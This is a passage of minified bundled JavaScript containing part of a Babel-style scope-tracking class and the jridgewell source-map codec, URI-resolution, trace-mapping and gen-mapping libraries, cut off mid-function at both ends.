B=cO1(W,[]);if(B._blockHoist=H,[z]=Q.unshiftContainer("body",[B]),!Y)Q.setData($,z)}let U=lO1(G,J),K=z.node.declarations.push(U);Q.scope.registerBinding(W,z.get("declarations")[K-1])}getProgramParent(){let X=this;do if(X.path.isProgram())return X;while(X=X.parent);throw Error("Couldn't find a Program")}getFunctionParent(){let X=this;do if(X.path.isFunctionParent())return X;while(X=X.parent);return null}getBlockParent(){let X=this;do if(X.path.isBlockParent())return X;while(X=X.parent);throw Error("We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...")}getPatternParent(){let X=this;do if(!X.path.isPattern())return X.getBlockParent();while(X=X.parent.parent);throw Error("We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...")}getAllBindings(){let X=Object.create(null),Q=this;do{for(let J of Object.keys(Q.bindings))if(J in X===!1)X[J]=Q.bindings[J];Q=Q.parent}while(Q);return X}bindingIdentifierEquals(X,Q){return this.getBindingIdentifier(X)===Q}getBinding(X){let Q=this,J;do{let W=Q.getOwnBinding(X);if(W){var Y;if((Y=J)!=null&&Y.isPattern()&&W.kind!=="param"&&W.kind!=="local");else return W}else if(!W&&X==="arguments"&&Q.path.isFunction()&&!Q.path.isArrowFunctionExpression())break;J=Q.path}while(Q=Q.parent)}getOwnBinding(X){return this.bindings[X]}getBindingIdentifier(X){var Q;return(Q=this.getBinding(X))==null?void 0:Q.identifier}getOwnBindingIdentifier(X){let Q=this.bindings[X];return Q==null?void 0:Q.identifier}hasOwnBinding(X){return!!this.getOwnBinding(X)}hasBinding(X,Q){if(!X)return!1;let J,Y,W;if(typeof Q==="object")J=Q.noGlobals,Y=Q.noUids,W=Q.upToScope;else if(typeof Q==="boolean")J=Q;let G=this;do{if(W===G)break;if(G.hasOwnBinding(X))return!0}while(G=G.parent);if(!Y&&this.hasUid(X))return!0;if(!J&&$6.globals.includes(X))return!0;if(!J&&$6.contextVariables.includes(X))return!0;return!1}parentHasBinding(X,Q){var J;return(J=this.parent)==null?void 0:J.hasBinding(X,Q)}moveBindingTo(X,Q){let J=this.getBinding(X);if(J)J.scope.removeOwnBinding(X),J.scope=Q,Q.bindings[X]=J}removeOwnBinding(X){delete this.bindings[X]}removeBinding(X){var Q;(Q=this.getBinding(X))==null||Q.scope.removeOwnBinding(X);{let J=this;do if(J.uids[X])J.uids[X]=!1;while(J=J.parent)}}hoistVariables(X=(Q)=>this.push({id:Q})){this.crawl();let Q=new Set;for(let J of Object.keys(this.bindings)){let Y=this.bindings[J];if(!Y)continue;let{path:W}=Y;if(!W.isVariableDeclarator())continue;let{parent:G,parentPath:H}=W;if(G.kind!=="var"||Q.has(G))continue;Q.add(W.parent);let $,z=[];for(let U of G.declarations){if($!=null||($=U.id),U.init)z.push(AO1("=",U.id,U.init));let K=Object.keys(nF(U,!1,!0,!0));for(let B of K)X(Q7(B),U.init!=null)}if(H.parentPath.isFor({left:G}))H.replaceWith($);else if(z.length===0)H.remove();else{let U=z.length===1?z[0]:sO1(z);if(H.parentPath.isForStatement({init:G}))H.replaceWith(U);else H.replaceWith(gO1(U))}}}}tF.default=$6;$6.globals=[...FO1,...OO1];$6.contextVariables=["arguments","undefined","Infinity","NaN"];$6.prototype._renameFromMap=function(Q,J,Y,W){if(Q[J])Q[Y]=W,Q[J]=null},$6.prototype.traverse=function(X,Q,J){(0,dF.default)(X,Q,this,J,this.path)},$6.prototype._generateUid=function(Q,J){let Y=Q;if(J>1)Y+=J;return`_${Y}`},$6.prototype.toArray=function(Q,J,Y){if(X7(Q)){let H=this.getBinding(Q.name);if(H!=null&&H.constant&&H.path.isGenericType("Array"))return Q}if(aF(Q))return Q;if(X7(Q,{name:"arguments"}))return yF(a$(a$(a$(Q7("Array"),Q7("prototype")),Q7("slice")),Q7("call")),[Q]);let W,G=[Q];if(J===!0)W="toConsumableArray";else if(typeof J==="number")G.push(mO1(J)),W="slicedToArray";else W="toArray";if(Y)G.unshift(this.path.hub.addHelper(W)),W="maybeArrayLike";return yF(this.path.hub.addHelper(W),G)},$6.prototype.getAllBindingsOfKind=function(...Q){let J=Object.create(null);for(let Y of Q){let W=this;do{for(let G of Object.keys(W.bindings)){let H=W.bindings[G];if(H.kind===Y)J[G]=H}W=W.parent}while(W)}return J},Object.defineProperties($6.prototype,{parentBlock:{configurable:!0,enumerable:!0,get(){return this.path.parent}},hub:{configurable:!0,enumerable:!0,get(){return this.path.hub}}})});var t$=m((s$,o4)=>{(function(X,Q){if(typeof s$==="object"&&typeof o4<"u")Q(o4),o4.exports=J(o4);else if(typeof define==="function"&&define.amd)define(["module"],function(Y){Q.apply(this,arguments),Y.exports=J(Y)});else{let Y={exports:{}};Q(Y),X=typeof globalThis<"u"?globalThis:X||self,X.sourcemapCodec=J(Y)}function J(Y){return"default"in Y.exports?Y.exports.default:Y.exports}})(s$,function(X){var{defineProperty:Q,getOwnPropertyDescriptor:J,getOwnPropertyNames:Y}=Object,W=Object.prototype.hasOwnProperty,G=(n,t)=>{for(var u in t)Q(n,u,{get:t[u],enumerable:!0})},H=(n,t,u,E)=>{if(t&&typeof t==="object"||typeof t==="function"){for(let y of Y(t))if(!W.call(n,y)&&y!==u)Q(n,y,{get:()=>t[y],enumerable:!(E=J(t,y))||E.enumerable})}return n},$=(n)=>H(Q({},"__esModule",{value:!0}),n),z={};G(z,{decode:()=>d,decodeGeneratedRanges:()=>h,decodeOriginalScopes:()=>N,encode:()=>D1,encodeGeneratedRanges:()=>o,encodeOriginalScopes:()=>C}),X.exports=$(z);var U=44,K=59,B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",q=new Uint8Array(64),Z=new Uint8Array(128);for(let n=0;n<B.length;n++){let t=B.charCodeAt(n);q[n]=t,Z[t]=n}function M(n,t){let u=0,E=0,y=0;do{let I=n.next();y=Z[I],u|=(y&31)<<E,E+=5}while(y&32);let a=u&1;if(u>>>=1,a)u=-2147483648|-u;return t+u}function L(n,t,u){let E=t-u;E=E<0?-E<<1|1:E<<1;do{let y=E&31;if(E>>>=5,E>0)y|=32;n.write(q[y])}while(E>0);return t}function R(n,t){if(n.pos>=t)return!1;return n.peek()!==U}var j=16384,F=typeof TextDecoder<"u"?new TextDecoder:typeof Buffer<"u"?{decode(n){return Buffer.from(n.buffer,n.byteOffset,n.byteLength).toString()}}:{decode(n){let t="";for(let u=0;u<n.length;u++)t+=String.fromCharCode(n[u]);return t}},A=class{constructor(){this.pos=0,this.out="",this.buffer=new Uint8Array(j)}write(n){let{buffer:t}=this;if(t[this.pos++]=n,this.pos===j)this.out+=F.decode(t),this.pos=0}flush(){let{buffer:n,out:t,pos:u}=this;return u>0?t+F.decode(n.subarray(0,u)):t}},O=class{constructor(n){this.pos=0,this.buffer=n}next(){return this.buffer.charCodeAt(this.pos++)}peek(){return this.buffer.charCodeAt(this.pos)}indexOf(n){let{buffer:t,pos:u}=this,E=t.indexOf(n,u);return E===-1?t.length:E}},w=[];function N(n){let{length:t}=n,u=new O(n),E=[],y=[],a=0;for(;u.pos<t;u.pos++){a=M(u,a);let I=M(u,0);if(!R(u,t)){let j1=y.pop();j1[2]=a,j1[3]=I;continue}let v=M(u,0),z1=M(u,0)&1?[a,I,0,0,v,M(u,0)]:[a,I,0,0,v],P1=w;if(R(u,t)){P1=[];do{let j1=M(u,0);P1.push(j1)}while(R(u,t))}z1.vars=P1,E.push(z1),y.push(z1)}return E}function C(n){let t=new A;for(let u=0;u<n.length;)u=_(n,u,t,[0]);return t.flush()}function _(n,t,u,E){let y=n[t],{0:a,1:I,2:v,3:g,4:H1,vars:z1}=y;if(t>0)u.write(U);E[0]=L(u,a,E[0]),L(u,I,0),L(u,H1,0);let P1=y.length===6?1:0;if(L(u,P1,0),y.length===6)L(u,y[5],0);for(let j1 of z1)L(u,j1,0);for(t++;t<n.length;){let j1=n[t],{0:k1,1:Y1}=j1;if(k1>v||k1===v&&Y1>=g)break;t=_(n,t,u,E)}return u.write(U),E[0]=L(u,v,E[0]),L(u,g,0),t}function h(n){let{length:t}=n,u=new O(n),E=[],y=[],a=0,I=0,v=0,g=0,H1=0,z1=0,P1=0,j1=0;do{let k1=u.indexOf(";"),Y1=0;for(;u.pos<k1;u.pos++){if(Y1=M(u,Y1),!R(u,k1)){let w1=y.pop();w1[2]=a,w1[3]=Y1;continue}let k=M(u,0),c=k&1,X1=k&2,N1=k&4,r=null,s=w,M1;if(c){let w1=M(u,I);v=M(u,I===w1?v:0),I=w1,M1=[a,Y1,0,0,w1,v]}else M1=[a,Y1,0,0];if(M1.isScope=!!N1,X1){let w1=g,i1=H1;g=M(u,g);let u1=w1===g;H1=M(u,u1?H1:0),z1=M(u,u1&&i1===H1?z1:0),r=[g,H1,z1]}if(M1.callsite=r,R(u,k1)){s=[];do{P1=a,j1=Y1;let w1=M(u,0),i1;if(w1<-1){i1=[[M(u,0)]];for(let u1=-1;u1>w1;u1--){let o1=P1;P1=M(u,P1),j1=M(u,P1===o1?j1:0);let k0=M(u,0);i1.push([k0,P1,j1])}}else i1=[[w1]];s.push(i1)}while(R(u,k1))}M1.bindings=s,E.push(M1),y.push(M1)}a++,u.pos=k1+1}while(u.pos<t);return E}function o(n){if(n.length===0)return"";let t=new A;for(let u=0;u<n.length;)u=p(n,u,t,[0,0,0,0,0,0,0]);return t.flush()}function p(n,t,u,E){let y=n[t],{0:a,1:I,2:v,3:g,isScope:H1,callsite:z1,bindings:P1}=y;if(E[0]<a)e(u,E[0],a),E[0]=a,E[1]=0;else if(t>0)u.write(U);E[1]=L(u,y[1],E[1]);let j1=(y.length===6?1:0)|(z1?2:0)|(H1?4:0);if(L(u,j1,0),y.length===6){let{4:k1,5:Y1}=y;if(k1!==E[2])E[3]=0;E[2]=L(u,k1,E[2]),E[3]=L(u,Y1,E[3])}if(z1){let{0:k1,1:Y1,2:k}=y.callsite;if(k1!==E[4])E[5]=0,E[6]=0;else if(Y1!==E[5])E[6]=0;E[4]=L(u,k1,E[4]),E[5]=L(u,Y1,E[5]),E[6]=L(u,k,E[6])}if(P1)for(let k1 of P1){if(k1.length>1)L(u,-k1.length,0);let Y1=k1[0][0];L(u,Y1,0);let k=a,c=I;for(let X1=1;X1<k1.length;X1++){let N1=k1[X1];k=L(u,N1[1],k),c=L(u,N1[2],c),L(u,N1[0],0)}}for(t++;t<n.length;){let k1=n[t],{0:Y1,1:k}=k1;if(Y1>v||Y1===v&&k>=g)break;t=p(n,t,u,E)}if(E[0]<v)e(u,E[0],v),E[0]=v,E[1]=0;else u.write(U);return E[1]=L(u,g,E[1]),t}function e(n,t,u){do n.write(K);while(++t<u)}function d(n){let{length:t}=n,u=new O(n),E=[],y=0,a=0,I=0,v=0,g=0;do{let H1=u.indexOf(";"),z1=[],P1=!0,j1=0;y=0;while(u.pos<H1){let k1;if(y=M(u,y),y<j1)P1=!1;if(j1=y,R(u,H1))if(a=M(u,a),I=M(u,I),v=M(u,v),R(u,H1))g=M(u,g),k1=[y,a,I,v,g];else k1=[y,a,I,v];else k1=[y];z1.push(k1),u.pos++}if(!P1)Q1(z1);E.push(z1),u.pos=H1+1}while(u.pos<=t);return E}function Q1(n){n.sort(V1)}function V1(n,t){return n[0]-t[0]}function D1(n){let t=new A,u=0,E=0,y=0,a=0;for(let I=0;I<n.length;I++){let v=n[I];if(I>0)t.write(K);if(v.length===0)continue;let g=0;for(let H1=0;H1<v.length;H1++){let z1=v[H1];if(H1>0)t.write(U);if(g=L(t,z1[0],g),z1.length===1)continue;if(u=L(t,z1[1],u),E=L(t,z1[2],E),y=L(t,z1[3],y),z1.length===4)continue;a=L(t,z1[4],a)}}return t.flush()}})});var XO=m((e$,Xz)=>{(function(X,Q){typeof e$==="object"&&typeof Xz<"u"?Xz.exports=Q():typeof define==="function"&&define.amd?define(Q):(X=typeof globalThis<"u"?globalThis:X||self,X.resolveURI=Q())})(e$,function(){let X=/^[\w+.-]+:\/\//,Q=/^([\w+.-]+:)\/\/([^@/#?]*@)?([^:/#?]*)(:\d+)?(\/[^#?]*)?(\?[^#]*)?(#.*)?/,J=/^file:(?:\/\/((?![a-z]:)[^/#?]*)?)?(\/?[^#?]*)(\?[^#]*)?(#.*)?/i;function Y(R){return X.test(R)}function W(R){return R.startsWith("//")}function G(R){return R.startsWith("/")}function H(R){return R.startsWith("file:")}function $(R){return/^[.?#]/.test(R)}function z(R){let j=Q.exec(R);return K(j[1],j[2]||"",j[3],j[4]||"",j[5]||"/",j[6]||"",j[7]||"")}function U(R){let j=J.exec(R),F=j[2];return K("file:","",j[1]||"","",G(F)?F:"/"+F,j[3]||"",j[4]||"")}function K(R,j,F,A,O,w,N){return{scheme:R,user:j,host:F,port:A,path:O,query:w,hash:N,type:7}}function B(R){if(W(R)){let F=z("http:"+R);return F.scheme="",F.type=6,F}if(G(R)){let F=z("http://foo.com"+R);return F.scheme="",F.host="",F.type=5,F}if(H(R))return U(R);if(Y(R))return z(R);let j=z("http://foo.com/"+R);return j.scheme="",j.host="",j.type=R?R.startsWith("?")?3:R.startsWith("#")?2:4:1,j}function q(R){if(R.endsWith("/.."))return R;let j=R.lastIndexOf("/");return R.slice(0,j+1)}function Z(R,j){if(M(j,j.type),R.path==="/")R.path=j.path;else R.path=q(j.path)+R.path}function M(R,j){let F=j<=4,A=R.path.split("/"),O=1,w=0,N=!1;for(let _=1;_<A.length;_++){let h=A[_];if(!h){N=!0;continue}if(N=!1,h===".")continue;if(h===".."){if(w)N=!0,w--,O--;else if(F)A[O++]=h;continue}A[O++]=h,w++}let C="";for(let _=1;_<O;_++)C+="/"+A[_];if(!C||N&&!C.endsWith("/.."))C+="/";R.path=C}function L(R,j){if(!R&&!j)return"";let F=B(R),A=F.type;if(j&&A!==7){let w=B(j),N=w.type;switch(A){case 1:F.hash=w.hash;case 2:F.query=w.query;case 3:case 4:Z(F,w);case 5:F.user=w.user,F.host=w.host,F.port=w.port;case 6:F.scheme=w.scheme}if(N>A)A=N}M(F,A);let O=F.query+F.hash;switch(A){case 2:case 3:return O;case 4:{let w=F.path.slice(1);if(!w)return O||".";if($(j||R)&&!$(w))return"./"+w+O;return w+O}case 5:return F.path+O;default:return F.scheme+"//"+F.user+F.host+F.port+F.path+O}}return L})});var Jz=m((Qz,s4)=>{(function(X,Q){if(typeof Qz==="object"&&typeof s4<"u")Q(s4,XO(),t$()),s4.exports=J(s4);else if(typeof define==="function"&&define.amd)define(["module","@jridgewell/resolve-uri","@jridgewell/sourcemap-codec"],function(Y){Q.apply(this,arguments),Y.exports=J(Y)});else{let Y={exports:{}};Q(Y,X.resolveURI,X.sourcemapCodec),X=typeof globalThis<"u"?globalThis:X||self,X.traceMapping=J(Y)}function J(Y){return"default"in Y.exports?Y.exports.default:Y.exports}})(Qz,function(X,Q,J){var{create:Y,defineProperty:W,getOwnPropertyDescriptor:G,getOwnPropertyNames:H,getPrototypeOf:$}=Object,z=Object.prototype.hasOwnProperty,U=(i,U1)=>function(){return U1||(0,i[H(i)[0]])((U1={exports:{}}).exports,U1),U1.exports},K=(i,U1)=>{for(var K1 in U1)W(i,K1,{get:U1[K1],enumerable:!0})},B=(i,U1,K1,R1)=>{if(U1&&typeof U1==="object"||typeof U1==="function"){for(let r1 of H(U1))if(!z.call(i,r1)&&r1!==K1)W(i,r1,{get:()=>U1[r1],enumerable:!(R1=G(U1,r1))||R1.enumerable})}return i},q=(i,U1,K1)=>(K1=i!=null?Y($(i)):{},B(U1||!i||!i.__esModule?W(K1,"default",{value:i,enumerable:!0}):K1,i)),Z=(i)=>B(W({},"__esModule",{value:!0}),i),M=U({"umd:@jridgewell/sourcemap-codec"(i,U1){U1.exports=J}}),L=U({"umd:@jridgewell/resolve-uri"(i,U1){U1.exports=Q}}),R={};K(R,{AnyMap:()=>g,FlattenMap:()=>g,GREATEST_LOWER_BOUND:()=>c,LEAST_UPPER_BOUND:()=>k,TraceMap:()=>X1,allGeneratedPositionsFor:()=>u1,decodedMap:()=>F6,decodedMappings:()=>s,eachMapping:()=>o1,encodedMap:()=>q8,encodedMappings:()=>r,generatedPositionFor:()=>i1,isIgnored:()=>B8,originalPositionFor:()=>w1,presortedDecodedMap:()=>i9,sourceContentFor:()=>b0,traceSegment:()=>M1}),X.exports=Z(R);var j=q(M()),F=q(L());function A(i){if(!i)return"";let U1=i.lastIndexOf("/");return i.slice(0,U1+1)}function O(i,U1){let K1=A(i),R1=U1?U1+"/":"";return(r1)=>(0,F.default)(R1+(r1||""),K1)}var w=0,N=1,C=2,_=3,h=4,o=1,p=2;function e(i,U1){let K1=d(i,0);if(K1===i.length)return i;if(!U1)i=i.slice();for(let R1=K1;R1<i.length;R1=d(i,R1+1))i[R1]=V1(i[R1],U1);return i}function d(i,U1){for(let K1=U1;K1<i.length;K1++)if(!Q1(i[K1]))return K1;return i.length}function Q1(i){for(let U1=1;U1<i.length;U1++)if(i[U1][w]<i[U1-1][w])return!1;return!0}function V1(i,U1){if(!U1)i=i.slice();return i.sort(D1)}function D1(i,U1){return i[w]-U1[w]}function n(i,U1){let K1=U1.map(()=>[]);for(let R1=0;R1<i.length;R1++){let r1=i[R1];for(let x1=0;x1<r1.length;x1++){let M0=r1[x1];if(M0.length===1)continue;let S0=M0[N],q0=M0[C],s0=M0[_],Q9=K1[S0];(Q9[q0]||(Q9[q0]=[])).push([s0,R1,M0[w]])}}for(let R1=0;R1<K1.length;R1++){let r1=K1[R1];for(let x1=0;x1<r1.length;x1++){let M0=r1[x1];if(M0)M0.sort(D1)}}return K1}var t=!1;function u(i,U1,K1,R1){while(K1<=R1){let r1=K1+(R1-K1>>1),x1=i[r1][w]-U1;if(x1===0)return t=!0,r1;if(x1<0)K1=r1+1;else R1=r1-1}return t=!1,K1-1}function E(i,U1,K1){for(let R1=K1+1;R1<i.length;K1=R1++)if(i[R1][w]!==U1)break;return K1}function y(i,U1,K1){for(let R1=K1-1;R1>=0;K1=R1--)if(i[R1][w]!==U1)break;return K1}function a(){return{lastKey:-1,lastNeedle:-1,lastIndex:-1}}function I(i,U1,K1,R1){let{lastKey:r1,lastNeedle:x1,lastIndex:M0}=K1,S0=0,q0=i.length-1;if(R1===r1){if(U1===x1)return t=M0!==-1&&i[M0][w]===U1,M0;if(U1>=x1)S0=M0===-1?0:M0;else q0=M0}return K1.lastKey=R1,K1.lastNeedle=U1,K1.lastIndex=u(i,U1,S0,q0)}function v(i){return typeof i==="string"?JSON.parse(i):i}var g=function(i,U1){let K1=v(i);if(!("sections"in K1))return new X1(K1,U1);let R1=[],r1=[],x1=[],M0=[],S0=[];H1(K1,U1,R1,r1,x1,M0,S0,0,0,1/0,1/0);let q0={version:3,file:K1.file,names:M0,sources:r1,sourcesContent:x1,mappings:R1,ignoreList:S0};return i9(q0)};function H1(i,U1,K1,R1,r1,x1,M0,S0,q0,s0,Q9){let{sections:J9}=i;for(let r9=0;r9<J9.length;r9++){let{map:e9,offset:u6}=J9[r9],c6=s0,Z8=Q9;if(r9+1<J9.length){let N7=J9[r9+1].offset;if(c6=Math.min(s0,S0+N7.line),c6===s0)Z8=Math.min(Q9,q0+N7.column);else if(c6<s0)Z8=q0+N7.column}z1(e9,U1,K1,R1,r1,x1,M0,S0+u6.line,q0+u6.column,c6,Z8)}}function z1(i,U1,K1,R1,r1,x1,M0,S0,q0,s0,Q9){let J9=v(i);if("sections"in J9)return H1(...arguments);let r9=new X1(J9,U1),e9=R1.length,u6=x1.length,c6=s(r9),{resolvedSources:Z8,sourcesContent:N7,ignoreList:OG}=r9;if(P1(R1,Z8),P1(x1,r9.names),N7)P1(r1,N7);else for(let X6=0;X6<Z8.length;X6++)r1.push(null);if(OG)for(let X6=0;X6<OG.length;X6++)M0.push(OG[X6]+e9);for(let X6=0;X6<c6.length;X6++){let AG=S0+X6;if(AG>s0)return;let kV=j1(K1,AG),RS=X6===0?q0:0,bV=c6[X6];for(let RG=0;RG<bV.length;RG++){let xX=bV[RG],FJ=RS+xX[w];if(AG===s0&&FJ>=Q9)return;if(xX.length===1){kV.push([FJ]);continue}let vV=e9+xX[N],xV=xX[C],fV=xX[_];kV.push(xX.length===4?[FJ,vV,xV,fV]:[FJ,vV,xV,fV,u6+xX[h]])}}}function P1(i,U1){for(let K1=0;K1<U1.length;K1++)i.push(U1[K1])}function j1(i,U1){for(let K1=i.length;K1<=U1;K1++)i[K1]=[];return i[U1]}var k1="`line` must be greater than 0 (lines start at line 1)",Y1="`column` must be greater than or equal to 0 (columns start at column 0)",k=-1,c=1,X1=class{constructor(i,U1){let K1=typeof i==="string";if(!K1&&i._decodedMemo)return i;let R1=v(i),{version:r1,file:x1,names:M0,sourceRoot:S0,sources:q0,sourcesContent:s0}=R1;this.version=r1,this.file=x1,this.names=M0||[],this.sourceRoot=S0,this.sources=q0,this.sourcesContent=s0,this.ignoreList=R1.ignoreList||R1.x_google_ignoreList||void 0;let Q9=O(U1,S0);this.resolvedSources=q0.map(Q9);let{mappings:J9}=R1;if(typeof J9==="string")this._encoded=J9,this._decoded=void 0;else if(Array.isArray(J9))this._encoded=void 0,this._decoded=e(J9,K1);else if(R1.sections)throw Error("TraceMap passed sectioned source map, please use FlattenMap export instead");else throw Error(`invalid source map: ${JSON.stringify(R1)}`);this._decodedMemo=a(),this._bySources=void 0,this._bySourceMemos=void 0}};function N1(i){return i}function r(i){var U1,K1;return(K1=(U1=N1(i))._encoded)!=null?K1:U1._encoded=(0,j.encode)(N1(i)._decoded)}function s(i){var U1;return(U1=N1(i))._decoded||(U1._decoded=(0,j.decode)(N1(i)._encoded))}function M1(i,U1,K1){let R1=s(i);if(U1>=R1.length)return null;let r1=R1[U1],x1=vX(r1,N1(i)._decodedMemo,U1,K1,c);return x1===-1?null:r1[x1]}function w1(i,U1){let{line:K1,column:R1,bias:r1}=U1;if(K1--,K1<0)throw Error(k1);if(R1<0)throw Error(Y1);let x1=s(i);if(K1>=x1.length)return O6(null,null,null,null);let M0=x1[K1],S0=vX(M0,N1(i)._decodedMemo,K1,R1,r1||c);if(S0===-1)return O6(null,null,null,null);let q0=M0[S0];if(q0.length===1)return O6(null,null,null,null);let{names:s0,resolvedSources:Q9}=i;return O6(Q9[q0[N]],q0[C]+1,q0[_],q0.length===5?s0[q0[h]]:null)}function i1(i,U1){let{source:K1,line:R1,column:r1,bias:x1}=U1;return _V(i,K1,R1,r1,x1||c,!1)}function u1(i,U1){let{source:K1,line:R1,column:r1,bias:x1}=U1;return _V(i,K1,R1,r1,x1||k,!0)}function o1(i,U1){let K1=s(i),{names:R1,resolvedSources:r1}=i;for(let x1=0;x1<K1.length;x1++){let M0=K1[x1];for(let S0=0;S0<M0.length;S0++){let q0=M0[S0],s0=x1+1,Q9=q0[0],J9=null,r9=null,e9=null,u6=null;if(q0.length!==1)J9=r1[q0[1]],r9=q0[2]+1,e9=q0[3];if(q0.length===5)u6=R1[q0[4]];U1({generatedLine:s0,generatedColumn:Q9,source:J9,originalLine:r9,originalColumn:e9,name:u6})}}}function k0(i,U1){let{sources:K1,resolvedSources:R1}=i,r1=K1.indexOf(U1);if(r1===-1)r1=R1.indexOf(U1);return r1}function b0(i,U1){let{sourcesContent:K1}=i;if(K1==null)return null;let R1=k0(i,U1);return R1===-1?null:K1[R1]}function B8(i,U1){let{ignoreList:K1}=i;if(K1==null)return!1;let R1=k0(i,U1);return R1===-1?!1:K1.includes(R1)}function i9(i,U1){let K1=new X1(t9(i,[]),U1);return N1(K1)._decoded=i.mappings,K1}function F6(i){return t9(i,s(i))}function q8(i){return t9(i,r(i))}function t9(i,U1){return{version:i.version,file:i.file,names:i.names,sourceRoot:i.sourceRoot,sources:i.sources,sourcesContent:i.sourcesContent,mappings:U1,ignoreList:i.ignoreList||i.x_google_ignoreList}}function O6(i,U1,K1,R1){return{source:i,line:U1,column:K1,name:R1}}function A6(i,U1){return{line:i,column:U1}}function vX(i,U1,K1,R1,r1){let x1=I(i,R1,U1,K1);if(t)x1=(r1===k?E:y)(i,R1,x1);else if(r1===k)x1++;if(x1===-1||x1===i.length)return-1;return x1}function AS(i,U1,K1,R1,r1){let x1=vX(i,U1,K1,R1,c);if(!t&&r1===k)x1++;if(x1===-1||x1===i.length)return[];let M0=t?R1:i[x1][w];if(!t)x1=y(i,M0,x1);let S0=E(i,M0,x1),q0=[];for(;x1<=S0;x1++){let s0=i[x1];q0.push(A6(s0[o]+1,s0[p]))}return q0}function _V(i,U1,K1,R1,r1,x1){var M0,S0;if(K1--,K1<0)throw Error(k1);if(R1<0)throw Error(Y1);let{sources:q0,resolvedSources:s0}=i,Q9=q0.indexOf(U1);if(Q9===-1)Q9=s0.indexOf(U1);if(Q9===-1)return x1?[]:A6(null,null);let J9=(M0=N1(i))._bySourceMemos||(M0._bySourceMemos=q0.map(a)),e9=((S0=N1(i))._bySources||(S0._bySources=n(s(i),J9)))[Q9][K1];if(e9==null)return x1?[]:A6(null,null);let u6=J9[Q9];if(x1)return AS(e9,u6,K1,R1,r1);let c6=vX(e9,u6,K1,R1,r1);if(c6===-1)return A6(null,null);let Z8=e9[c6];return A6(Z8[o]+1,Z8[p])}})});var QO=m((Yz,t4)=>{(function(X,Q){if(typeof Yz==="object"&&typeof t4<"u")Q(t4,t$(),Jz()),t4.exports=J(t4);else if(typeof define==="function"&&define.amd)define(["module","@jridgewell/sourcemap-codec","@jridgewell/trace-mapping"],function(Y){Q.apply(this,arguments),Y.exports=J(Y)});else{let Y={exports:{}};Q(Y,X.sourcemapCodec,X.traceMapping),X=typeof globalThis<"u"?globalThis:X||self,X.genMapping=J(Y)}function J(Y){return"default"in Y.exports?Y.exports.default:Y.exports}})(Yz,function(X,Q,J){var{create:Y,defineProperty:W,getOwnPropertyDescriptor:G,getOwnPropertyNames:H,getPrototypeOf:$}=Object,z=Object.prototype.hasOwnProperty,U=(r,s)=>function(){return s||(0,r[H(r)[0]])((s={exports:{}}).exports,s),s.exports},K=(r,s)=>{for(var M1 in s)W(r,M1,{get:s[M1],enumerable:!0})},B=(r,s,M1,w1)=>{if(s&&typeof s==="object"||typeof s==="function"){for(let i1 of H(s))if(!z.call(r,i1)&&i1!==M1)W(r,i1,{get:()=>s[i1],enumerable:!(w1=G(s,i1))||w1.enumerable})}return r},q=(r,s,M1)=>(M1=r!=null?Y($(r)):{},B(s||!r||!r.__esModule?W(M1,"default",{value:r,enumerable:!0}):M1,r)),Z=(r)=>B(W({},"__esModule",{value:!0}),r),M=U({"umd:@jridgewell/sourcemap-codec"(r,s){s.exports=Q}}),L=U({"umd:@jridgewell/trace-mapping"(r,s){s.exports=J}}),R={};K(R,{GenMapping:()=>Q1,addMapping:()=>n,addSegment:()=>D1,allMappings:()=>g,fromMap:()=>v,maybeAddMapping:()=>u,maybeAddSegment:()=>t,setIgnore:()=>y,setSourceContent:()=>E,toDecodedMap:()=>a,toEncodedMap:()=>I}),X.exports=Z(R);var j=class{constructor(){this._indexes={__proto__:null},this.array=[]}};function F(r){return r}function A(r,s){return F(r)._indexes[s]}function O(r,s){let M1=A(r,s);if(M1!==void 0)return M1;let{array:w1,_indexes:i1}=F(r),u1=w1.push(s);return i1[s]=u1-1}function w(r,s){let M1=A(r,s);if(M1===void 0)return;let{array:w1,_indexes:i1}=F(r);for(let u1=M1+1;u1<w1.length;u1++){let o1=w1[u1];w1[u1-1]=o1,i1[o1]--}i1[s]=void 0,w1.pop()}var N=q(M()),C=q(L()),_=0,h=1,o=2,p=3,e=4,d=-1,Q1=class{constructor({file:r,sourceRoot:s}={}){this._names=new j,this._sources=new j,this._sourcesContent=[],this._mappings=[],this.file=r,this.sourceRoot=s,this._ignoreList=new j}};function V1(r){return r}function D1(r,s,M1,w1,i1,u1,o1,k0){return H1(!1,r,s,M1,w1,i1,u1,o1,k0)}function n(r,s){return N1(!1,r,s)}var t=(r,s,M1,w1,i1,u1,o1,k0)=>{return H1(!0,r,s,M1,w1,i1,u1,o1,k0)},u=(r,s)=>{return N1(!0,r,s)};function E(r,s,M1){let{_sources:w1,_sourcesContent:i1}=V1(r),u1=O(w1,s);i1[u1]=M1}function y(r,s,M1=!0){let{_sources:w1,_sourcesContent:i1,_ignoreList:u1}=V1(r),o1=O(w1,s);if(o1===i1.length)i1[o1]=null;if(M1)O(u1,o1);else w(u1,o1)}function a(r){let{_mappings:s,_sources:M1,_sourcesContent:w1,_names:i1,_ignoreList:u1}=V1(r);return Y1(s),{version:3,file:r.file||void 0,names:i1.array,sourceRoot:r.sourceRoot||void 0,sources:M1.array,sourcesContent:w1,mappings:s,ignoreList:u1.array}}function I(r){let s=a(r);return Object.assign({},s,{mappings:(0,N.encode)(s.mappings)})}function v(r){let s=new C.TraceMap(r),M1=new Q1({file:s.file,sourceRoot:s.sourceRoot});if(k(V1(M1)._names,s.names),k(V1(M1)._sources,s.sources),V1(M1)._sourcesContent=s.sourcesContent||s.sources.map(()=>null),V1(M1)._mappings=(0,C.decodedMappings)(s),s.ignoreList)k(V1(M1)._ignoreList,s.ignoreList);return M1}function g(r){let s=[],{_mappings:M1,_sources:w1,_names:i1}=V1(r);for(let u1=0;u1<M1.length;u1++){let o1=M1[u1];for(let k0=0;k0<o1.length;k0++){let b0=o1[k0],B8={line:u1+1,column:b0[_]},i9=void 0,F6=void 0,q8=void 0;if(b0.length!==1){if(i9=w1.array[b0[h]],F6={line:b0[o]+1,column:b0[p]},b0.length===5)q8=i1.array[b0[e]]}s.push({generated:B8,source:i9,original:F6,name:q8})}}return s}function H1(r,s,M1,w1,i1,u1,o1,k0,b0){let{_mappings:B8,_sources:i9,_sourcesContent:F6,_names:q8}=V1(s),t9=P1(B8,M1),O6=j1(t9,w1);if(!i1){if(r&&c(t9,O6))return;return k1(t9,O6,[w1])}z1(u1),z1(o1);let 